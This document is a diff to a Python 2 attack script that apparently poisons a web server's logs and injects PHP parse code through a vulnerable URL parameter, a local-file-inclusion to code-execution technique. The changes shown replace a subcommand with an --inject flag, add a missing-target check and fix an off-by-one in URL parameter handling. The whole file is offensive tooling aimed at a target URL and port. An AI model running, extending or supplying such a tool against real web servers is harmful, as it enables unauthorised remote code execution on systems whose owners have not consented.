@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 import urllib
 import requests
 import argparse
@@ -9,15 +11,16 @@ parser.add_argument('-f', '--file', required=True, type=str, help='file with cod
 parser.add_argument('-u', '--url', required=True, type=str, help='full vulnerable url (minus injected parameter')
 parser.add_argument('-p', '--parameter', required=True, type=str, help='injected parameter (ex: cmd)')
 parser.add_argument('-v', '--verbose', action='count', default=0, help='v: increased detail; vv: even more detail')
-subparsers = parser.add_subparsers(help='inject -h for details')
-
-parser_inj = subparsers.add_parser('inject')
-parser_inj.add_argument('target', type=str, help='target to inject parser')
-parser_inj.add_argument('--port', default=80, type=int, help='port to inject (default: 80)')
+parser.add_argument('--inject', action='store_true', help='inject php parse code')
+parser.add_argument('--target', type=str, help='target to inject parser')
+parser.add_argument('--port', default=80, type=int, help='port to inject (default: 80)')
 args = parser.parse_args()
 
 
 def inject_php_parser(target, port, parameter, verbose):
+    if target is None:
+        print '[!] you must provide a target with the inject parameter! Exiting...'
+        exit(2)
     if target.startswith('http://'):
         tmp_target = target[7:]
     elif target.startswith('https://'):
@@ -52,7 +55,7 @@ def poision_web_logs(infile, inurl, parameter, verbose):
                 print 'VERBOSE: {0}'.format(tmp_url)
             # save end parameter separate, in case of null byte inclusion
             end_url = ''
-            if len(tmp_url) > 1:
+            if len(tmp_url) > 0:
                 end_url = tmp_url.pop()
             if verbose > 1:
                 print 'VERBOSE: {0}'.format(end_url)
@@ -84,6 +87,6 @@ def poision_web_logs(infile, inurl, parameter, verbose):
 
 
 if __name__ == '__main__':
-    if args.target:
+    if args.inject:
         inject_php_parser(args.target, args.port, args.parameter, args.verbose)
     poision_web_logs(args.file, args.url, args.parameter, args.verbose)
